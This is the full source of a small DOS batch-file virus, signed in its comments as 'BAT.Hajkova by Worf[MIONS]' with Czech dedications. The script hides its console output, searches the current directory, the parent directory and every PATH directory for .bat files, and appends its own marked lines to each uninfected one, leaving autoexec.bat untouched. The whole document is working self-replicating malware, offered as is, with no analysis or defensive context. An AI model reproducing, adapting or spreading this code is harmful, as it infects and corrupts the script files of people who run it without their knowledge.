@echo off > nul.haj
@ctty nul > nul.haj
if "%1=="/haj_p goto haj_inf
if "%1=="/haj_o goto haj_loop
for %%a in (. .. %path%) do call %0 /haj_o %%a
goto haj_end
:haj_loop
for %%a in (%2\*.bat) do call %0 /haj_p %%a
goto haj_end
:haj_inf
find "haj"<%2> nul
if errorlevel 1 goto haj_st
goto haj_end
:haj_st
if "%2=="autoexec.bat exit >nul.haj
set haj=%2
find "haj"<%0>>%2
if errorlevel 1 find "haj"<%0.bat>>%haj%
:haj_end
::Venovano Pavle Hajkove :)
::Diky Mimimu za seznameni s P. Hajkovou :)))
::For AV's BAT.Hajkova by Worf[MIONS]